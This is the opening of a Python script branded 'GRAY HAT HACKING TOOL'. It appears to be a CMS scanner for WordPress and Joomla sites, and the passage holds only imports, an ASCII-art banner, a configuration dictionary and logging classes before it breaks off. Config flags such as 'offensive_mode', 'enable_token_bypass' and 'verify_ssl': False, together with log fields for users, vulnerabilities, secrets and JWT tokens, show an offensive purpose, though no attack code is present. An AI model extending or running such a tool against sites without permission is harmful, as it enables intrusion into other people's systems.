#!/usr/bin/python3
import sys, os, json, time, re, hashlib, base64, random, socket, ssl
import urllib.parse, urllib.request, urllib.error
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from datetime import datetime
from collections import defaultdict
import argparse, threading, queue, concurrent.futures, logging, traceback
import subprocess, tempfile, zipfile, shutil, sqlite3, http.cookiejar
import xml.etree.ElementTree as ET
from html.parser import HTMLParser
from html import escape
from functools import partial
from typing import Dict, List, Tuple, Optional, Any, Union
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import signal, errno, importlib, inspect
from http.client import HTTPConnection
import hmac
from colorama import init, Fore, Back, Style
import pprint

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    dns = None

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    whois = None

try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False
    jwt = None

try:
    import xmltodict
    XMLTODICT_AVAILABLE = True
except ImportError:
    XMLTODICT_AVAILABLE = False
    xmltodict = None

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False
    yaml = None

try:
    import toml
    TOML_AVAILABLE = True
except ImportError:
    TOML_AVAILABLE = False
    toml = None

try:
    import jsonpath_ng
    JSONPATH_AVAILABLE = True
except ImportError:
    JSONPATH_AVAILABLE = False
    jsonpath_ng = None

try:
    import lxml
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False
    lxml = None

try:
    from bs4 import BeautifulSoup
    from bs4 import Comment
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    BeautifulSoup = None
    Comment = None

try:
    import magic
    MAGIC_AVAILABLE = True
except ImportError:
    MAGIC_AVAILABLE = False
    magic = None

try:
    import netaddr
    NETADDR_AVAILABLE = True
except ImportError:
    NETADDR_AVAILABLE = False
    netaddr = None

try:
    import geoip2.database
    GEOIP_AVAILABLE = True
except ImportError:
    GEOIP_AVAILABLE = False
    geoip2 = None

try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa, ec
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    cryptography = None

try:
    import asyncio
    import aiohttp
    from aiohttp import ClientTimeout, ClientSession, TCPConnector
    ASYNCIO_AVAILABLE = True
except ImportError:
    ASYNCIO_AVAILABLE = False
    asyncio = None
    aiohttp = None

try:
    import aiodns
    AIODNS_AVAILABLE = True
except ImportError:
    AIODNS_AVAILABLE = False
    aiodns = None

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False
    websocket = None

try:
    import brotli
    BROTLI_AVAILABLE = True
except ImportError:
    BROTLI_AVAILABLE = False
    brotli = None

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    Image = None

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'; BLUE = '\033[94m'; CYAN = '\033[96m'; GREEN = '\033[92m'
    YELLOW = '\033[93m'; RED = '\033[91m'; BOLD = '\033[1m'; DIM = '\033[2m'
    UNDERLINE = '\033[4m'; RESET = '\033[0m'; WHITE = '\033[97m'; MAGENTA = '\033[35m'
    LIGHT_GRAY = '\033[37m'; DARK_GRAY = '\033[90m'; BRIGHT_GREEN = '\033[92;1m'
    BRIGHT_RED = '\033[91;1m'; BRIGHT_YELLOW = '\033[93;1m'; BRIGHT_CYAN = '\033[96;1m'
    BRIGHT_MAGENTA = '\033[95;1m'; ORANGE = '\033[38;5;208m'; PINK = '\033[38;5;206m'
    GOLD = '\033[38;5;220m'; LIME = '\033[38;5;154m'; TEAL = '\033[38;5;37m'
    PURPLE = '\033[38;5;129m'; CORAL = '\033[38;5;203m'; SKY = '\033[38;5;117m'
    DARK = '\033[38;5;239m'; BORDER = '\033[38;5;240m'

BANNER="""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠿⠛⠛⠛⠛⠛⠶⠶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⢿⠟⠁⠀⠠⠀⠄⠀⠔⠂⠠⠄⠀⠀⠈⠙⠛⢶⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢿⢣⠏⠎⠀⠀⠀⠠⠀⢁⠊⠐⠀⡀⠉⠀⠀⠀⠀⠀⠈⠛⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠇⡎⢸⠸⡀⠁⡇⠀⡄⢂⠸⡀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢻⠀⡇⢸⡄⢿⠄⢃⠀⠐⡈⠠⠐⢄⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⢸⠀⢷⠌⢷⡀⠳⣄⣂⠠⠌⠠⡈⠢⣈⠠⡁⢀⠐⠀⠀⡀⠀⠀⠐⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠘⡖⡘⣾⣌⠻⣦⡀⠙⠳⢤⣀⠤⡑⢬⡀⠈⠠⠀⠈⠀⠀⠀⠀⠀⠂⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⢧⠠⣻⣼⡧⣄⡻⢧⣄⡀⠘⠻⢿⡤⣛⢤⠀⠀⠀⠀⣀⠃⠀⠀⠀⠃⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⢛⣿⡃⠀⢛⡤⠠⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⢷⡌⢳⣌⠺⣝⡿⣿⣷⣮⣽⡳⢦⣄⠙⢮⠻⠄⠄⢀⠒⠠⠌⠄⠀⠀⠈⡄⠀⠘⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠉⠀⠀⠉⠉⠉⠑⠦⢤⡙⠲⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣄⠻⣦⡙⠳⣮⣝⡳⣿⣿⣾⠿⣳⣝⢷⡀⢻⠦⠬⠐⠀⠄⢑⠒⠠⠄⠀⠐⠂⠀⠂⡜⣿⣦⠀⠀⠀⠀⠀⠀⠀⣼⠏⠀⠀⠀⣈⡬⠤⠧⣐⠀⠄⠀⠳⣄⣸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣧⣈⢛⠷⢤⣉⣛⣿⣿⣿⢼⡋⠙⣧⠻⢀⠐⠀⠈⠡⠌⠁⠊⡐⠂⠀⠈⣁⠀⠀⢠⢁⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⢠⠏⠀⠀⠀⠀⠀⠙⢆⠂⡀⠸⠉⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠖⠒⠚⠒⠒⠒⠤⠄⡀⠀⠀⠀⠀⠀⠈⠻⢷⣽⣓⠦⣭⣙⣻⣿⣿⣧⣿⣿⡱⠁⢠⣶⣦⣬⡁⠀⠐⠄⠀⠀⠀⠠⠤⢣⢀⣾⠏⠀⠀⠀⠀⠀⠀⠸⡇⠀⠈⢸⡀⠀⠀⠀⠀⠀⠀⠈⢇⠠⠀⢻⣦⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⠟⠉⠀⢀⣠⣤⠴⠴⠤⠦⣤⣄⡈⠑⠢⡀⠀⠀⠀⠀⠀⠉⠛⠿⢶⣷⣽⣿⣿⣿⣿⣿⠁⠀⣿⣏⠙⣿⣿⣦⣀⣹⠀⠀⠀⠀⠂⠈⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠐⡀⢳⡄⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⢀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣤⡝⠁⠀⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠈⠙⠶⣄⠉⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡀⢇⢣⡙⠿⢷⣿⣟⠏⡂⠁⢀⠀⢈⡁⠀⣿⠀⠀⠀⢀⢴⡄⠀⠀⠀⠀⠹⣄⠃⠀⢻⣆⠀⠀⠀⠀⠀⢨⠂⠐⢸⣾⢶⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡎⡼⠀⢀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⠈⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣷⣮⣦⣈⡙⢋⣁⠵⣀⠔⠎⡠⠀⠀⠆⠒⣻⡀⠀⢠⠏⡜⠀⠀⠀⠀⠀⠀⠈⢳⣀⡀⢋⣆⠀⠀⠀⠀⢸⠁⠒⢸⢃⢈⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠞⢻⠁⠀⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⣹⡀⠀⠀⠀⠀⠀⠀⣀⣤⡾⢻⢻⣿⣿⡳⣍⠛⠛⠛⠛⠋⠉⠀⠀⡀⠄⠀⠀⢊⢈⠼⣧⠀⢸⠀⢧⡀⠀⠀⠀⠀⠀⠀⠀⣱⠒⣸⢻⠀⠀⠀⢀⡎⠀⠐⡾⠺⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣴⣎⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⣹⠁⠀⠀⠀⣠⡴⢚⠋⣇⣧⣼⣾⣿⠏⠛⠮⣍⠂⠄⠀⠤⠖⠂⠀⠐⠀⢁⠀⠀⡀⡐⠻⣧⠈⢧⡈⠳⣤⣀⡀⠀⠀⣀⡤⠏⢀⠞⡞⠀⠀⢀⡞⠀⠀⢺⣁⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⡀⡿⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⡐⡎⠀⢀⡴⡞⣹⣰⣼⠿⠋⣏⣿⡿⠋⢀⠂⠠⠀⠀⠀⢀⠀⢀⠀⣀⣀⠀⠐⠀⠀⠤⢱⡀⠘⣧⡀⠛⢶⣤⠸⢍⡋⠏⠡⡴⠊⢙⠟⠀⢀⡴⠋⠀⠀⢀⠞⢹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢳⠷⣧⠠⠄⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣖⣒⣒⣭⡆⠝⠀⣠⡟⣆⡷⠟⠉⢁⡀⣦⣿⠟⠁⠀⠆⡀⠠⢄⠀⠒⠀⠀⠤⠠⠤⠤⠔⠈⡡⠀⠀⠈⣧⠊⡀⠙⠶⣄⣈⠉⠛⠓⠦⠔⠈⠋⣀⣤⠖⠋⠀⠀⠀⢤⣼⡶⠃⣠⢔⣪⡭⢭⣥⡒⢄⡀⠀⠀
⢸⢀⢸⠆⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⣰⣿⠟⢩⠀⡀⢧⣸⣿⡿⠃⠀⡀⠐⠠⢈⠑⠠⠈⠁⢀⠀⠀⢀⣨⣭⢁⡀⠀⠒⠀⠀⣿⣿⣀⠄⠀⠀⠉⠙⠛⠒⠒⠒⠛⠋⠉⠀⠀⠀⠀⡀⢰⣏⠜⠀⢰⢹⡋⠀⠀⠀⠀⠙⢳⡝⢆⠀
⠈⣾⠞⢧⡐⠀⠀⠀⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠋⢁⢠⠘⣆⢳⣾⡿⠋⠀⠀⠐⠀⣩⣾⣿⣿⣇⠀⠀⠠⣄⣑⣩⣷⣾⣿⣷⣆⢉⠀⠀⢹⣿⡛⢦⡅⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⣄⡨⠞⠁⠀⠀⠀⠻⢗⣺⠟⠀⠀⠀⠀⢻⡆⢆
⠀⠸⣤⡀⣩⣀⠀⠀⠀⠀⠉⠓⠶⢤⣄⣀⣀⣠⠤⠖⠋⠁⠀⢀⠸⣈⣧⣼⠿⠋⠀⠀⠀⢀⢁⣼⡿⠋⢹⣿⡇⠀⠀⠀⢢⣽⣿⠿⣵⣿⣿⣿⡄⢐⠀⠈⢿⣿⡷⣿⣗⣓⣼⠄⠣⢤⣠⡦⣤⣴⡦⠼⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡸⢸
⠀⠀⠻⣷⠟⠛⠲⣄⡀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⡀⢠⠸⣤⣿⠟⠋⠀⠀⠀⠀⠄⢨⣾⢿⣇⣴⣾⣿⠃⠀⢀⡒⣮⣿⣿⡆⠙⢿⣏⢹⣇⠈⠄⠀⠸⣿⣷⢻⣿⣿⠙⠶⠦⠚⠛⠃⠛⠉⠁⠀⠀⠀⠀⠀⠀⣀⡤⠴⠴⠦⢤⣀⠀⡀⠀⣀⣈⡃⡼
⠀⠀⠀⠈⢷⣶⣄⣸⣷⠶⢤⣀⠀⠀⡀⢠⠀⡄⢰⣈⣦⣵⠾⠛⠉⠀⠀⠀⠀⠀⠄⢃⣴⡏⣠⣄⡿⠛⣽⠃⠀⡀⠀⢹⣿⣿⠃⠀⠀⠸⣿⡾⣿⠀⠂⣀⠀⠹⣿⣡⣦⢙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⢀⡀⠀⠈⠁⠚⠂⠔⢋⡴⠁
⠀⠀⠀⠀⠀⠈⠛⠻⣇⠻⣷⣬⡿⠷⠖⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀⠀⡀⠠⣈⣧⣾⡟⠉⣹⠿⠋⣠⠞⠁⠀⠠⢌⠑⣾⡇⡾⠈⠌⡁⢰⣿⣆⣸⣇⠁⠤⠀⠀⠹⣿⣿⡇⢀⠙⢷⣄⡀⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⣠⣴⠟⠋⠉⠙⠓⠖⠒⠒⠚⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡬⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⢀⣢⣼⣶⡿⠛⢛⣷⡿⣃⡴⠟⠁⠀⠀⢀⡐⢦⣿⠿⢻⠇⠐⠂⢀⡾⠻⣿⠟⠻⣆⠂⡁⠀⠀⠙⣷⢹⣷⣄⡀⠈⠙⠓⠶⠶⠶⠚⠉⠀⢀⡰⠶⡷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⢀⠀⣄⣤⡰⡴⢦⣷⠼⠖⢷⡿⠚⠛⣿⠋⠉⣹⣦⡶⣿⣿⠞⠋⠀⠀⠀⠀⠀⢠⣽⡿⣇⣴⠎⠀⠉⠀⣸⣦⣤⡏⣿⣆⣿⣄⠀⠀⠀⠀⠈⠻⣽⣟⢻⣶⣦⣄⣀⣀⣀⣀⡠⠴⠾⣧⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⠃⠀⠀⢄⣢⣏⡥⠟⠓⠒⠒⣻⣦⡴⠾⠷⠶⠶⠟⠋⢹⣇⣿⡾⠋⠁⠀⠀⠀⡀⢢⣰⣼⣿⠋⣀⡽⠋⠀⠐⢀⡾⠋⢻⠏⠀⠈⢿⣀⡈⣇⠠⠀⢀⠀⠀⠀⠉⠻⠾⣿⣙⣏⣁⣀⣹⡧⠴⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣛⠀⠀⠠⢴⡿⠋⠀⢀⡴⠊⣉⣁⣈⣉⠓⢄⠀⠀⠀⠀⣸⡟⠉⠀⠀⠀⡀⢄⣣⡼⣿⠋⠉⢹⡿⠛⠀⠠⢀⣥⡾⣧⡴⠏⠀⠀⠀⠈⠿⡟⠛⠢⡄⠁⠔⢀⠀⠀⠀⠀⠀⠉⠙⠛⠿⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠐⠹⡀⠀⠐⢿⡇⠀⢀⡎⢠⠞⠉⠁⠈⠙⢷⡄⢣⠀⠀⣰⠏⠀⠀⠀⢄⡲⠾⢿⢀⣀⣸⣷⡿⠋⢀⠠⣨⣴⣾⣇⣤⠞⠀⠀⠀⠀⠀⠀⠀⠙⢶⣦⡟⠳⢦⣁⡐⢃⠄⣠⢀⠀⠀⠀⠀⠀⠉⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡛⠓⡔⠀⠸⣇⠀⠸⣧⠸⡀⠀⠫⡱⡀⠀⡷⢈⡆⢰⡏⠀⠀⠠⣹⣿⣤⣤⡼⠟⢫⣿⠋⠀⢀⣠⣾⠋⡀⡿⠋⠁⠀⠀⣀⠤⠔⠒⠒⠤⣄⠀⠈⠳⢦⣼⣟⠉⢻⡶⠶⣴⣾⢤⣄⣐⣀⠄⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠐⢶⡮⣄⠀⠹⣦⠀⠛⠀⡑⠂⣐⡼⠁⢀⡟⠀⡇⣾⠁⠀⠈⢰⣇⣀⣹⠋⠀⣰⡿⠁⠀⣸⡏⣀⡼⠛⠉⠀⠀⠀⠀⡔⢡⡶⠞⠙⠳⠂⣄⠙⢦⠀⠀⠉⠛⠟⠻⠷⠴⠿⢧⣼⣿⣍⣿⢷⣅⠀⡀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⣤⣈⡧⢤⡈⠓⢦⣥⣈⣉⣁⣠⣴⠟⣠⣾⣇⣿⠀⣐⠂⡿⠋⠹⠃⠀⢠⣿⠁⠉⣰⠋⡟⠁⠀⠀⠀⠀⠀⠀⢸⢠⠏⠀⠀⠀⠀⠀⠐⢥⠀⢳⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠈⠙⠻⣿⣧⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⣦⣀⣷⠦⢄⣀⣉⣉⠉⣉⠤⣶⠝⣃⣠⣿⡀⠄⠀⣿⠾⢶⠀⠀⣾⡇⠀⠀⣿⠎⠀⠀⠀⠀⠀⠀⡀⠀⠸⡈⢇⠀⠀⠀⠀⠀⠀⠘⡆⠈⡇⠀⠀⢀⡴⠋⣡⠤⠚⠷⠀⠀⠀⠀⠹⣿⡆⠀⠀⡹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠦⠄⠺⣭⣤⠽⠓⠋⠁⢀⠉⡇⣹⡇⠒⠀⣧⣤⣨⠀⠀⣿⡇⠂⠀⡟⠀⠀⠀⠀⣠⠞⢋⣉⣝⡳⢿⡪⠭⠿⠝⠃⠀⠀⠀⡧⠀⣿⠀⢰⡝⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠉⠀⣥⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠃⡿⣿⡎⠀⠸⣏⢈⡇⠀⢹⣿⡁⠀⢻⡀⠀⢀⡞⠁⡰⡗⠙⠓⠺⣢⢹⡀⠀⠀⠀⠀⠀⢀⡇⢠⡏⠀⡏⡇⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⡈⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⠀⠀⠀⢰⣼⢲⡇⠘⣷⠁⠀⢹⣿⠛⡆⠈⣿⣧⠀⠀⢳⣤⡞⠀⣼⡞⠀⠀⠀⠀⢸⣧⠃⠀⠀⠀⠀⠀⡞⢠⣿⠃⠀⣿⡇⠘⡆⠀⠀⠀⠀⠀⠀⠀⣴⡟⠀⢰⠈⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢂⡵⠞⠃⠀⠀⣜⡻⢸⠃⠀⠘⢿⣄⠀⠙⢦⣿⡓⢸⣏⡳⡄⠀⠹⢷⣶⣡⠁⠀⠀⢠⣔⣫⠞⠀⠀⠀⠀⡠⠎⢀⡞⡏⠀⠀⠱⣼⣄⠙⢦⣀⣀⠀⢀⣠⣴⠟⠁⣠⣿⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢾⠀⠀⠀⠀⣰⡻⢁⡏⠀⠀⠀⠀⠙⢷⣄⠀⠈⠉⠉⠉⠻⡏⠱⢤⠀⠙⠻⠶⣤⡄⣀⣉⣀⣀⣠⡤⠖⢋⣠⡔⢉⡟⠀⠀⠀⠀⠙⠬⡷⠦⢌⣉⣙⠉⢉⣀⢤⣾⣀⡤⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣌⠳⢦⣴⠾⢋⣠⠏⠀⠀⠀⠀⠀⠀⠀⠈⠛⠳⠶⠶⢶⠶⠿⠷⢶⡟⠒⠢⣀⣀⣀⣉⣉⣉⡡⢤⣤⠎⠉⡹⠛⠋⠀⠀⠀⠀⠀⠀⠀⠙⠦⠼⢧⣀⡽⢯⣤⠴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠓⠒⠚⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⠖⠿⢤⣁⣀⡿⣇⣀⡤⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 

=========================================================
===     ===  =====  ===      ===    =====  =====        =
==  ===  ==   ===   ==  ====  ===  =====    ====  =======
=  ========  =   =  ==  ====  ===  ====  ==  ===  =======
=  ========  == ==  ===  ========  ===  ====  ==  =======
=  ========  =====GRAY HAT HACKING TOOL=====  ==
=  ========  =====  =======  ====  ===        ==  =======
=  ========  =====  ==  ====  ===  ===  ====  ==  =======
==  ===  ==  =====  ==  ====  ===  ===  ====  ==  =======
===     ===  =====  ===      ===    ==  ====  ==  =======
========================================================= """

CFG = {
    'verbose': True, 'batch': False, 'ignore': [], 'strict': [], 'light': False,
    'only': False, 'skip': False, 'follow': False, 'no_redirect': False,
    'redirect_conf': '0', 'cms_id': '', 'cms_name': '', 'cms_url': '',
    'cms_version': '', 'detection_method': '', 'target_url': '',
    'show_raw': True, 'enable_advanced': True, 'enable_offensive': True,
    'enable_recon': True, 'enable_token_bypass': True, 'deep_scan_level': 5,
    'timeout': 60, 'max_retries': 5, 'concurrent_requests': 10,
    'enable_dns_enum': True, 'enable_geoip': True, 'enable_whois': True,
    'max_plugins': 100, 'max_themes': 50, 'max_users': 50,
    'enable_ml_detection': True, 'enable_ai_payloads': True,
    'offensive_mode': True, 'stealth_mode': False, 'proxy': None,
    'tor': False, 'cache_enabled': True, 'cache_ttl': 3600,
    'rate_limit': 10, 'rate_window': 60, 'verify_ssl': False,
    'async_enabled': True, 'max_async_requests': 20, 'debug': False,
    'db_enabled': True, 'db_path': 'cmsiaf.db', 'log_file': 'cmsiaf.log',
    'log_level': 'INFO'
}

LOG = '{"url":"","last_scanned":"","detection_param":"","cms_id":"","cms_name":"","cms_url":"","cms_version":"","wp_version":"","wp_plugins":"","wp_themes":"","wp_users":"","wp_vulns":"","wp_vuln_count":"","wp_readme_file":"","wp_license":"","wp_uploads_directory":"","xmlrpc":"","user_registration":"","path":"","joomla_version":"","joomla_admin":"","joomla_backups":"","joomla_confs":"","joomla_dirs":"","joomla_debug":"","joomla_registration":"","joomla_vulns":"","detection_confidence":"","waf":"","cdn":"","plugins_enum":"","themes_enum":"","subdomains":"","api_endpoints":"","secrets_found":"","jwt_tokens":"","graphql_schema":""}'
LOG_DIR = ""
TOTAL_REQUESTS = 0
CSTART = time.time()
REPORT_INDEX = {}
DETECTION_METHODS = ['headers', 'generator', 'source', 'robots', 'dirs', 'js', 'css', 'cookies', 'favicon', 'sitemap', 'xmlrpc', 'server', 'meta', 'comments', 'license', 'readme', 'changelog', 'error_pages', 'session', 'api', 'cdn', 'waf', 'tech_stack']
RAW_DATA = {}

class Logger:
    def __init__(self):
        log_level = getattr(logging, CFG.get('log_level', 'INFO').upper())
        logging.basicConfig(level=log_level, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[logging.FileHandler(CFG.get('log_file', 'cmsiaf.log')), logging.StreamHandler()])
        self.logger = logging.getLogger('CMSIAF')
    def info(self, msg): self.logger.info(msg)
    def warning(self, msg): self.logger.warning(msg)
    def error(self, msg): self.logger.error(msg)
    def debug(self, msg): self.logger.debug(msg)

class ReconLogger:
    def __init__(self): self.logs = []; self.raw_data = {}
    def log(self, level, msg, data=None):
        ts = datetime.now().strftime('%H:%M:%S.%f')[:-3]
